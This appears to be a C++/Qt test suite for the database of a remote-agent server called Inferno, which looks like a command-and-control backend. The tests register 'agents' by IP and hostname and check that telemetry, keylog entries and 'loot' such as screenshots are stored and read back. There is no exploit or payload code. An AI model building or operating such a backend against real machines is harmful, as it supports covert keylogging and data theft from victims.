#include "../server/include/database/Inferno_Database.hpp"
#include <iostream>
#include <cassert>
#include <QCoreApplication>
#include <QFile>
#include <QTextStream>
#include <QUuid>
#include <QThread>

void loadEnv(const QString& binaryPath) {
    QFile file(binaryPath);
    if (!file.exists()) {
        file.setFileName(QCoreApplication::applicationDirPath() + "/../.env");
    }

    if (!file.open(QIODevice::ReadOnly | QIODevice::Text)) return;

    QTextStream in(&file);
    while (!in.atEnd()) {
        QString line = in.readLine().trimmed();
        if (line.isEmpty() || line.startsWith("#")) continue;
        
        QStringList parts = line.split("=", Qt::SkipEmptyParts);
        if (parts.size() >= 2) {
            QString key = parts.at(0).trimmed();
            QString value = parts.mid(1).join("=").trimmed();
            qputenv(key.toLocal8Bit().constData(), value.toLocal8Bit());
        }
    }
}

void test_db_singleton() {
    std::cout << "[TEST] Testing Database Singleton & Initialization..." << std::endl;
    
    // Load Tactical Secrets - Anchored to Binary Location
    loadEnv(QCoreApplication::applicationDirPath() + "/.env");
    
    // Attempt initialization with environment variables
    QString dbHost = qEnvironmentVariable("INFERNO_DB_HOST");
    int dbPort = qEnvironmentVariable("INFERNO_DB_PORT").toInt();
    QString dbName = qEnvironmentVariable("INFERNO_DB_NAME");
    QString dbUser = qEnvironmentVariable("INFERNO_DB_USER");
    QString dbPass = qEnvironmentVariable("INFERNO_DB_PASSWORD");

    bool ok = inferno::Inferno_Database::instance().initialize(
        dbHost.isEmpty() ? "127.0.0.1" : dbHost, 
        dbPort > 0 ? dbPort : 5432, 
        dbName.isEmpty() ? "inferno_db" : dbName, 
        dbUser.isEmpty() ? "operator" : dbUser, 
        dbPass);
    
    if (!ok) {
        std::cerr << "[FATAL] Database initialization failed. Aborting TDD suite." << std::endl;
        exit(1);
    }

    std::cout << "[PASS] Database connected successfully." << std::endl;
}

void test_db_agent_registration() {
    std::cout << "[TEST] Testing Agent Registration (UUID persistence)..." << std::endl;
    
    // Use dynamic UUID to prevent stale record verification
    QString test_uuid = "TEST-REG-" + QUuid::createUuid().toString(QUuid::WithoutBraces).left(8);
    QString ip = "192.168.1.50";
    
    int id1 = inferno::Inferno_Database::instance().registerAgent(test_uuid, ip, "TestBox", "macOS 15");
    assert(id1 > 0 && "Agent registration should return valid SQL ID");

    // Second registration (UPSERT)
    int id2 = inferno::Inferno_Database::instance().registerAgent(test_uuid, "10.0.0.5", "TestBox-Updated", "macOS 15.1");
    assert(id1 == id2 && "UPSERT should return the same internal ID for the same UUID");

    std::cout << "[PASS] Agent UPSERT logic verified (ID: " << id2 << ")." << std::endl;
}

void test_db_telemetry_history() {
    std::cout << "[TEST] Testing Telemetry History retrieval..." << std::endl;
    
    QString test_uuid = "TEST-TEL-" + QUuid::createUuid().toString(QUuid::WithoutBraces).left(8);
    QString marker = "Verification-Signal-" + QUuid::createUuid().toString(QUuid::WithoutBraces).left(12);
    
    inferno::Inferno_Database::instance().registerAgent(test_uuid, "127.0.0.1", "HistBox", "Linux");
    inferno::Inferno_Database::instance().logTelemetry(test_uuid, "TEST", marker);

    QStringList history = inferno::Inferno_Database::instance().getTelemetryHistory(test_uuid);

    bool found = false;
    for (const QString& line : history) {
        if (line.contains(marker)) {
            found = true;
            break;
        }
    }

    assert(found && "Telemetry record should be retrievable from SQL");
    std::cout << "[PASS] Telemetry persistence verified." << std::endl;
}

void test_db_keylog_history() {
    std::cout << "[TEST] Testing Keylog History retrieval..." << std::endl;
    
    QString test_uuid = "TEST-KEY-" + QUuid::createUuid().toString(QUuid::WithoutBraces).left(8);
    QString marker = "Keystroke-Data-" + QUuid::createUuid().toString(QUuid::WithoutBraces).left(12);
    
    inferno::Inferno_Database::instance().registerAgent(test_uuid, "127.0.0.1", "KeyBox", "Linux");
    bool ok = inferno::Inferno_Database::instance().logKeylog(test_uuid, marker);
    assert(ok && "Keylog should be saved to SQL");
    
    QStringList history = inferno::Inferno_Database::instance().getKeylogHistory(test_uuid, 10);
    bool found = false;
    for (const QString& entry : history) {
        if (entry.contains(marker)) {
            found = true;
            break;
        }
    }
    
    assert(found && "Keylog record should be retrievable from SQL via JOIN");
    std::cout << "[PASS] Keylog history persistence verified." << std::endl;
}

void test_db_loot_persistence() {
    std::cout << "[TEST] Testing Loot (Binary) persistence..." << std::endl;
    
    QString test_uuid = "TEST-LOOT-" + QUuid::createUuid().toString(QUuid::WithoutBraces).left(8);
    QByteArray test_data = QByteArray::fromHex("89504E470D0A1A0A"); // PNG Header
    
    // Register agent first (PostgreSQL requires a valid reference)
    inferno::Inferno_Database::instance().registerAgent(test_uuid, "127.0.0.1", "LootBox", "Linux");
    
    bool ok = inferno::Inferno_Database::instance().logLoot(test_uuid, "screenshot.png", "image/png", test_data);
    assert(ok && "Loot logging should return true");
    
    std::cout << "[PASS] Loot (BYTEA) persistence verified." << std::endl;
}

class DbReaderThread : public QThread {
    QString m_uuid;
    bool& m_success;
public:
    DbReaderThread(const QString& uuid, bool& success) : m_uuid(uuid), m_success(success) {}
protected:
    void run() override {
        // Retrieve telemetry history from this thread
        QStringList hist = inferno::Inferno_Database::instance().getTelemetryHistory(m_uuid);
        m_success = !hist.isEmpty();
    }
};

void test_db_multithreaded_read() {
    std::cout << "[TEST] Testing Multithreaded Database Reads..." << std::endl;
    QString test_uuid = "TEST-MT-" + QUuid::createUuid().toString(QUuid::WithoutBraces).left(8);
    inferno::Inferno_Database::instance().registerAgent(test_uuid, "127.0.0.1", "MTBox", "Linux");
    inferno::Inferno_Database::instance().logTelemetry(test_uuid, "TEST", "ThreadSafeCheck");

    bool success = false;
    DbReaderThread reader(test_uuid, success);
    reader.start();
    reader.wait();

    assert(success && "Telemetries should be successfully read from the worker thread");
    std::cout << "[PASS] Multithreaded database reads verified." << std::endl;
}
